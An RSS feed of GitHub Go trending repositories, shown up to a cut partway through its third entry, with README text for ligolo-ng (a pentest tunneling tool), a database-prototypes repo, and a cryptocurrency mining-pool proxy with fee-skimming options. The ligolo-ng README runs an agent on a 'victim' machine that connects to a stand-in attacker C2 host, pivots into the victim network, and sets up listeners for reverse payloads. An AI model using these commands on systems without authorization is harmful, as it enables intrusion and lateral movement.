<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-01-19T01:36:47Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>nicocha30/ligolo-ng</title>
    <updated>2024-01-19T01:36:47Z</updated>
    <id>tag:github.com,2024-01-19:/nicocha30/ligolo-ng</id>
    <link href="https://github.com/nicocha30/ligolo-ng" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Ligolo-ng : Tunneling like a VPN&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/doc/logo.png&#34; alt=&#34;Ligolo Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;An advanced, yet simple, tunneling tool that uses TUN interfaces.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.gnu.org/licenses/gpl-3.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-GPLv3-brightgreen.svg?sanitize=true&#34; alt=&#34;GPLv3&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/nicocha30/ligolo-ng&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/nicocha30/ligolo-ng&#34; alt=&#34;Go Report&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/sponsors/nicocha30&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/sponsors/nicocha30&#34; alt=&#34;GitHub Sponsors&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;You use Ligolo-ng for your penetration tests? Did it help you pass a certification? Please consider sponsoring the project so I can buy my team some drinks. ☕&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/sponsors/nicocha30&#34;&gt;&lt;span&gt;❤️&lt;/span&gt; Sponsor nicocha30&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;!-- START doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;!-- DON&#39;T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#how-is-this-different-from-ligolochiselmeterpreter-&#34;&gt;How is this different from Ligolo/Chisel/Meterpreter... ?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#building--usage&#34;&gt;Building &amp;amp; Usage&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#precompiled-binaries&#34;&gt;Precompiled binaries&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#building-ligolo-ng&#34;&gt;Building Ligolo-ng&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#setup-ligolo-ng&#34;&gt;Setup Ligolo-ng&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#linux&#34;&gt;Linux&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#windows&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#running-ligolo-ng-proxy-server&#34;&gt;Running Ligolo-ng proxy server&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#tls-options&#34;&gt;TLS Options&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#using-lets-encrypt-autocert&#34;&gt;Using Let&#39;s Encrypt Autocert&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#using-your-own-tls-certificates&#34;&gt;Using your own TLS certificates&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#automatic-self-signed-certificates-not-recommended&#34;&gt;Automatic self-signed certificates (NOT RECOMMENDED)&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#using-ligolo-ng&#34;&gt;Using Ligolo-ng&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#agent-bindinglistening&#34;&gt;Agent Binding/Listening&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#access-to-agents-local-ports-127001&#34;&gt;Access to agent&#39;s local ports (127.0.0.1)&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#demo&#34;&gt;Demo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#does-it-require-administratorroot-access-&#34;&gt;Does it require Administrator/root access ?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#supported-protocolspackets&#34;&gt;Supported protocols/packets&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#performance&#34;&gt;Performance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#caveats&#34;&gt;Caveats&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#todo&#34;&gt;Todo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/#credits&#34;&gt;Credits&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- END doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Ligolo-ng&lt;/strong&gt; is a &lt;em&gt;simple&lt;/em&gt;, &lt;em&gt;lightweight&lt;/em&gt; and &lt;em&gt;fast&lt;/em&gt; tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a &lt;strong&gt;tun interface&lt;/strong&gt; (without the need of SOCKS).&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Tun interface&lt;/strong&gt; (No more SOCKS!)&lt;/li&gt; &#xA; &lt;li&gt;Simple UI with &lt;em&gt;agent&lt;/em&gt; selection and &lt;em&gt;network information&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Easy to use and setup&lt;/li&gt; &#xA; &lt;li&gt;Automatic certificate configuration with Let&#39;s Encrypt&lt;/li&gt; &#xA; &lt;li&gt;Performant (Multiplexing)&lt;/li&gt; &#xA; &lt;li&gt;Does not require high privileges&lt;/li&gt; &#xA; &lt;li&gt;Socket listening/binding on the &lt;em&gt;agent&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Multiple platforms supported for the &lt;em&gt;agent&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Can handle multiple tunnels&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How is this different from Ligolo/Chisel/Meterpreter... ?&lt;/h2&gt; &#xA;&lt;p&gt;Instead of using a SOCKS proxy or TCP/UDP forwarders, &lt;strong&gt;Ligolo-ng&lt;/strong&gt; creates a userland network stack using &lt;a href=&#34;https://gvisor.dev/&#34;&gt;Gvisor&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When running the &lt;em&gt;relay/proxy&lt;/em&gt; server, a &lt;strong&gt;tun&lt;/strong&gt; interface is used, packets sent to this interface are translated, and then transmitted to the &lt;em&gt;agent&lt;/em&gt; remote network.&lt;/p&gt; &#xA;&lt;p&gt;As an example, for a TCP connection:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;SYN are translated to connect() on remote&lt;/li&gt; &#xA; &lt;li&gt;SYN-ACK is sent back if connect() succeed&lt;/li&gt; &#xA; &lt;li&gt;RST is sent if ECONNRESET, ECONNABORTED or ECONNREFUSED syscall are returned after connect&lt;/li&gt; &#xA; &lt;li&gt;Nothing is sent if timeout&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This allows running tools like &lt;em&gt;nmap&lt;/em&gt; without the use of &lt;em&gt;proxychains&lt;/em&gt; (simpler and faster).&lt;/p&gt; &#xA;&lt;h2&gt;Building &amp;amp; Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Precompiled binaries&lt;/h3&gt; &#xA;&lt;p&gt;Precompiled binaries (Windows/Linux/macOS) are available on the &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng/releases&#34;&gt;Release page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Building Ligolo-ng&lt;/h3&gt; &#xA;&lt;p&gt;Building &lt;em&gt;ligolo-ng&lt;/em&gt; (Go &amp;gt;= 1.20 is required):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ go build -o agent cmd/agent/main.go&#xA;$ go build -o proxy cmd/proxy/main.go&#xA;# Build for Windows&#xA;$ GOOS=windows go build -o agent.exe cmd/agent/main.go&#xA;$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Setup Ligolo-ng&lt;/h3&gt; &#xA;&lt;h4&gt;Linux&lt;/h4&gt; &#xA;&lt;p&gt;When using Linux, you need to create a tun interface on the Proxy Server (C2):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ sudo ip tuntap add user [your_username] mode tun ligolo&#xA;$ sudo ip link set ligolo up&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Windows&lt;/h4&gt; &#xA;&lt;p&gt;You need to download the &lt;a href=&#34;https://www.wintun.net/&#34;&gt;Wintun&lt;/a&gt; driver (used by &lt;a href=&#34;https://www.wireguard.com/&#34;&gt;WireGuard&lt;/a&gt;) and place the &lt;code&gt;wintun.dll&lt;/code&gt; in the same folder as Ligolo (make sure you use the right architecture).&lt;/p&gt; &#xA;&lt;h4&gt;Running Ligolo-ng proxy server&lt;/h4&gt; &#xA;&lt;p&gt;Start the &lt;em&gt;proxy&lt;/em&gt; server on your Command and Control (C2) server (default port 11601):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ ./proxy -h # Help options&#xA;$ ./proxy -autocert # Automatically request LetsEncrypt certificates&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;TLS Options&lt;/h3&gt; &#xA;&lt;h4&gt;Using Let&#39;s Encrypt Autocert&lt;/h4&gt; &#xA;&lt;p&gt;When using the &lt;code&gt;-autocert&lt;/code&gt; option, the proxy will automatically request a certificate (using Let&#39;s Encrypt) for &lt;em&gt;attacker_c2_server.com&lt;/em&gt; when an agent connects.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Port 80 needs to be accessible for Let&#39;s Encrypt certificate validation/retrieval&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h4&gt;Using your own TLS certificates&lt;/h4&gt; &#xA;&lt;p&gt;If you want to use your own certificates for the proxy server, you can use the &lt;code&gt;-certfile&lt;/code&gt; and &lt;code&gt;-keyfile&lt;/code&gt; parameters.&lt;/p&gt; &#xA;&lt;h4&gt;Automatic self-signed certificates (NOT RECOMMENDED)&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;em&gt;proxy/relay&lt;/em&gt; can automatically generate self-signed TLS certificates using the &lt;code&gt;-selfcert&lt;/code&gt; option.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;-ignore-cert&lt;/code&gt; option needs to be used with the &lt;em&gt;agent&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Using Ligolo-ng&lt;/h3&gt; &#xA;&lt;p&gt;Start the &lt;em&gt;agent&lt;/em&gt; on your target (victim) computer (no privileges are required!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ ./agent -connect attacker_c2_server.com:11601&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;If you want to tunnel the connection over a SOCKS5 proxy, you can use the &lt;code&gt;--socks ip:port&lt;/code&gt; option. You can specify SOCKS credentials using the &lt;code&gt;--socks-user&lt;/code&gt; and &lt;code&gt;--socks-pass&lt;/code&gt; arguments.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;A session should appear on the &lt;em&gt;proxy&lt;/em&gt; server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;INFO[0102] Agent joined. name=nchatelain@nworkstation remote=&#34;XX.XX.XX.XX:38000&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;session&lt;/code&gt; command to select the &lt;em&gt;agent&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ligolo-ng » session &#xA;? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Display the network configuration of the agent using the &lt;code&gt;ifconfig&lt;/code&gt; command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Agent : nchatelain@nworkstation] » ifconfig &#xA;[...]&#xA;┌─────────────────────────────────────────────┐&#xA;│ Interface 3                                 │&#xA;├──────────────┬──────────────────────────────┤&#xA;│ Name         │ wlp3s0                       │&#xA;│ Hardware MAC │ de:ad:be:ef:ca:fe            │&#xA;│ MTU          │ 1500                         │&#xA;│ Flags        │ up|broadcast|multicast       │&#xA;│ IPv4 Address │ 192.168.0.30/24             │&#xA;└──────────────┴──────────────────────────────┘&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Add a route on the &lt;em&gt;proxy/relay&lt;/em&gt; server to the &lt;em&gt;192.168.0.0/24&lt;/em&gt; &lt;em&gt;agent&lt;/em&gt; network.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Linux&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ sudo ip route add 192.168.0.0/24 dev ligolo&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Windows&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; netsh int ipv4 show interfaces&#xA;&#xA;Idx     Mét         MTU          État                Nom&#xA;---  ----------  ----------  ------------  ---------------------------&#xA; 25           5       65535  connected     ligolo&#xA;   &#xA;&amp;gt; route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start the tunnel on the proxy:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Agent : nchatelain@nworkstation] » start_tunnel&#xA;[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also specify a custom tuntap interface using the &lt;code&gt;--tun iface&lt;/code&gt; option:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Agent : nchatelain@nworkstation] » start_tunnel --tun mycustomtuntap&#xA;[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can now access the &lt;em&gt;192.168.0.0/24&lt;/em&gt; &lt;em&gt;agent&lt;/em&gt; network from the &lt;em&gt;proxy&lt;/em&gt; server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ nmap 192.168.0.0/24 -v -sV -n&#xA;[...]&#xA;$ rdesktop 192.168.0.123&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Agent Binding/Listening&lt;/h3&gt; &#xA;&lt;p&gt;You can listen to ports on the &lt;em&gt;agent&lt;/em&gt; and &lt;em&gt;redirect&lt;/em&gt; connections to your control/proxy server.&lt;/p&gt; &#xA;&lt;p&gt;In a ligolo session, use the &lt;code&gt;listener_add&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp&#xA;INFO[1208] Listener created on remote agent!            &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the &lt;code&gt;proxy&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ nc -lvp 4321&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When a connection is made on the TCP port &lt;code&gt;1234&lt;/code&gt; of the agent, &lt;code&gt;nc&lt;/code&gt; will receive the connection.&lt;/p&gt; &#xA;&lt;p&gt;This is very useful when using reverse tcp/udp payloads.&lt;/p&gt; &#xA;&lt;p&gt;You can view currently running listeners using the &lt;code&gt;listener_list&lt;/code&gt; command and stop them using the &lt;code&gt;listener_stop [ID]&lt;/code&gt; command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Agent : nchatelain@nworkstation] » listener_list &#xA;┌───────────────────────────────────────────────────────────────────────────────┐&#xA;│ Active listeners                                                              │&#xA;├───┬─────────────────────────┬────────────────────────┬────────────────────────┤&#xA;│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │&#xA;├───┼─────────────────────────┼────────────────────────┼────────────────────────┤&#xA;│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │&#xA;└───┴─────────────────────────┴────────────────────────┴────────────────────────┘&#xA;&#xA;[Agent : nchatelain@nworkstation] » listener_stop 0&#xA;INFO[1505] Listener closed.                             &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Access to agent&#39;s local ports (127.0.0.1)&lt;/h3&gt; &#xA;&lt;p&gt;If you need to access the local ports of the currently connected agent, there&#39;s a &#34;magic&#34; IP hardcoded in Ligolo-ng: &lt;em&gt;240.0.0.1&lt;/em&gt; ( This IP address is part of an unused IPv4 subnet). If you query this IP address, Ligolo-ng will automatically redirect traffic to the agent&#39;s local IP address (127.0.0.1).&lt;/p&gt; &#xA;&lt;p&gt;Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo ip route add 240.0.0.1/32 dev ligolo&#xA;$ nmap 240.0.0.1 -sV&#xA;Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET&#xA;Nmap scan report for 240.0.0.1&#xA;Host is up (0.023s latency).&#xA;Not shown: 998 closed tcp ports (conn-refused)&#xA;PORT STATE SERVICE VERSION&#xA;22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)&#xA;8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)&#xA;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#xA;&#xA;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#xA;Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Demo&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4&#34;&gt;https://user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Does it require Administrator/root access ?&lt;/h2&gt; &#xA;&lt;p&gt;On the &lt;em&gt;agent&lt;/em&gt; side, no! Everything can be performed without administrative access.&lt;/p&gt; &#xA;&lt;p&gt;However, on your &lt;em&gt;relay/proxy&lt;/em&gt; server, you need to be able to create a &lt;em&gt;tun&lt;/em&gt; interface.&lt;/p&gt; &#xA;&lt;h2&gt;Supported protocols/packets&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;TCP&lt;/li&gt; &#xA; &lt;li&gt;UDP&lt;/li&gt; &#xA; &lt;li&gt;ICMP (echo requests)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Performance&lt;/h2&gt; &#xA;&lt;p&gt;You can easily hit more than 100 Mbits/sec. Here is a test using &lt;code&gt;iperf&lt;/code&gt; from a 200Mbits/s server to a 200Mbits/s connection.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ iperf3 -c 10.10.0.1 -p 24483&#xA;Connecting to host 10.10.0.1, port 24483&#xA;[  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483&#xA;[ ID] Interval           Transfer     Bitrate         Retr  Cwnd&#xA;[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       &#xA;[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       &#xA;[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       &#xA;[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       &#xA;[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       &#xA;[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       &#xA;[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       &#xA;[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       &#xA;[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       &#xA;[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       &#xA;- - - - - - - - - - - - - - - - - - - - - - - - -&#xA;[ ID] Interval           Transfer     Bitrate         Retr&#xA;[  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender&#xA;[  5]   0.00-10.08  sec   125 MBytes   104 Mbits/sec                  receiver&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Caveats&lt;/h2&gt; &#xA;&lt;p&gt;Because the &lt;em&gt;agent&lt;/em&gt; is running without privileges, it&#39;s not possible to forward raw packets. When you perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent.&lt;/p&gt; &#xA;&lt;p&gt;When using &lt;em&gt;nmap&lt;/em&gt;, you should use &lt;code&gt;--unprivileged&lt;/code&gt; or &lt;code&gt;-PE&lt;/code&gt; to avoid false positives.&lt;/p&gt; &#xA;&lt;h2&gt;Todo&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Implement other ICMP error messages (this will speed up UDP scans) ;&lt;/li&gt; &#xA; &lt;li&gt;Do not &lt;em&gt;RST&lt;/em&gt; when receiving an &lt;em&gt;ACK&lt;/em&gt; from an invalid TCP connection (nmap will report the host as up) ;&lt;/li&gt; &#xA; &lt;li&gt;Add mTLS support.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Nicolas Chatelain &amp;lt;nicolas -at- chatelain.me&amp;gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>arpitbbhayani/database-fundamentals</title>
    <updated>2024-01-19T01:36:47Z</updated>
    <id>tag:github.com,2024-01-19:/arpitbbhayani/database-fundamentals</id>
    <link href="https://github.com/arpitbbhayani/database-fundamentals" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Prototype implementations of database internal concepts and algorithms.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Database Fundamentals&lt;/h1&gt; &#xA;&lt;p&gt;The repository contains prototype implementations of fundamental concepts and algorithms covering Database Internals.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Variable length integer encoding • &lt;a href=&#34;https://github.com/arpitbbhayani/database-fundamentals/tree/master/varint&#34;&gt;Source&lt;/a&gt; • &lt;a href=&#34;https://youtu.be/9b2e_iRVJ0k&#34;&gt;YouTube Video&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Delta compression • &lt;a href=&#34;https://github.com/arpitbbhayani/database-fundamentals/tree/master/delta&#34;&gt;Source&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Do star the repository, if you find these prototypes helpful.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>zero-proxy/zero-proxy</title>
    <updated>2024-01-19T01:36:47Z</updated>
    <id>tag:github.com,2024-01-19:/zero-proxy/zero-proxy</id>
    <link href="https://github.com/zero-proxy/zero-proxy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;最轻量、高效、透明、稳定的多币种矿池代理、矿池中转。支持 BTC, ETC, RVN, NicaHash, XNA, ETHW, Ergo 等币种。自定义抽水账号及比例，高性能数据中转算法，无任何share损耗。具有高效的抽水算法，保证精确抽水。支持多端口监听及多矿池连接，同时接入3000+矿机性能稳定且不掉线。The lightest, most efficient, transparent, and stable multi-cryptocurrency mining pool proxy.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://zeroproxy.app&#34;&gt; &lt;img width=&#34;200&#34; src=&#34;https://zeroproxy.app/static/images/logo2.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;h1 align=&#34;center&#34;&gt;Zero Proxy&lt;/h1&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt;最轻量、高效、透明、稳定的多币种矿池代理。&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;简体中文 | &lt;a href=&#34;https://raw.githubusercontent.com/zero-proxy/zero-proxy/master/README-en_US.md&#34;&gt;English&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🔗 官网&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zeroproxy.app/&#34;&gt;Zero Proxy 官网&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;邮箱 &lt;a href=&#34;mailto:zeroproxytech@gmail.com&#34;&gt;zeroproxytech@gmail.com&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;✨ 特性&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;🎨 多币种支持，Zero Proxy 可同时多端口代理 BTC, ETC, RVN, NICEHASH, XNA, ETHW, ERGO 等多币种。&lt;/li&gt; &#xA; &lt;li&gt;🔥 支持 2miners/hiveon/poolin/f2pool/ezil 等多种知名矿池。&lt;/li&gt; &#xA; &lt;li&gt;🚀 以 aws-t3.micro 为例，单台服务器可稳定接入 3000+ 台矿机并稳定运行。&lt;/li&gt; &#xA; &lt;li&gt;🌈 